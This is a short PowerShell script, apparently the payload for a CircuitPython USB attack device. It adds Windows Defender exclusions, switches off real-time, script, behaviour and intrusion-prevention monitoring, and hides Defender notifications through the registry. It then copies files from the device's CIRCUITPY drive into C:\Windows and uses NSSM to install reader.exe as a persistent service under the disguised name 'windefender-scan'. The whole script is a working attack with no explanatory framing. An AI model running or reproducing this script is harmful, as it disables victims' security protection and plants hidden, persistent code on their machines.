# Disable Enhanced Notifications

powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "C:\Windows\reader.exe"'

powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name DisableEnhancedNotifications -Value 1

# Disable Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Find the CIRCUITPY drive
$driveLetter = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "CIRCUITPY" } | Select-Object -ExpandProperty DeviceID

if ($driveLetter) {
    $sourcePath = Join-Path $driveLetter "data"
    $destinationPath = "C:\Windows"

    # Check if the source path exists
    if (Test-Path $sourcePath) {
        # Copy files from CIRCUITPY to the Windows folder
        Copy-Item -Path "$sourcePath\*" -Destination $destinationPath -Recurse -Force
        Set-Location -Path $destinationPath

        # Define NSSM path and service parameters
        $nssmPath = Join-Path $destinationPath "nssm.exe"  # Assuming nssm.exe is copied to the Windows folder
        $serviceName = "windefender-scan"
        $exePath = Join-Path $destinationPath "reader.exe"

        # Check if NSSM and the reader.exe file exist
        if ((Test-Path $nssmPath) -and (Test-Path $exePath)) {
            # Install and start the service
            & $nssmPath install $serviceName $exePath
            & $nssmPath start $serviceName
        } else {
            Write-Host "nssm.exe or reader.exe not found in the destination path."
        }
    } else {
        Write-Host "Source folder 'data' not found on CIRCUITPY drive."
    }
} else {
    Write-Host "CIRCUITPY drive not found."
}
